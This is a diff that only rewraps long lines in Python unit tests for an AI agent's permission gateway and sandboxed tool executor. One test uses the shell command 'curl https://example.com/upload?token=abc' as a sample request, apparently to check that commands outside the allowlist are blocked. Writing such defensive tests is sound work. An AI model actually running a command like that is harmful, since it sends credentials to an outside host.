@@ -38,7 +38,9 @@ class RecordingExecutor:
         gateway_result: GatewayResult,
     ) -> ExecutionResult:
         self.calls.append(request)
-        return ExecutionResult(request, gateway_result, True, 0, stdout="ok", reason="executed")
+        return ExecutionResult(
+            request, gateway_result, True, 0, stdout="ok", reason="executed"
+        )
 
 
 class ExecutorBoundaryTests(unittest.TestCase):
@@ -67,12 +69,16 @@ class ExecutorBoundaryTests(unittest.TestCase):
         self.assertEqual(result.gateway_result.decision, Decision.ALLOW)
         self.assertEqual(result.gateway_result.approval_method, "test_yes")
 
-    def test_send_email_requires_strong_approval_then_executes_when_approved(self) -> None:
+    def test_send_email_requires_strong_approval_then_executes_when_approved(
+        self,
+    ) -> None:
         inner = RecordingExecutor()
         gateway = PermissionGateway(self.policy, approvals=ApproveAllProvider())
         executor = SafeToolExecutor(gateway, inner)
 
-        result = executor.execute(AgentActionRequest.send_email("recipient@example.invalid"))
+        result = executor.execute(
+            AgentActionRequest.send_email("recipient@example.invalid")
+        )
 
         self.assertTrue(result.executed)
         self.assertEqual(result.gateway_result.decision, Decision.ALLOW)
@@ -102,7 +108,9 @@ class ExecutorBoundaryTests(unittest.TestCase):
         gateway = PermissionGateway(self.policy, approvals=ApproveAllProvider())
         shell = ShellCommandExecutor(allowed_commands={"echo"})
         executor = SafeToolExecutor(gateway, shell)
-        request = AgentActionRequest.shell_command("curl https://example.com/upload?token=abc")
+        request = AgentActionRequest.shell_command(
+            "curl https://example.com/upload?token=abc"
+        )
 
         result = executor.execute(request)
 
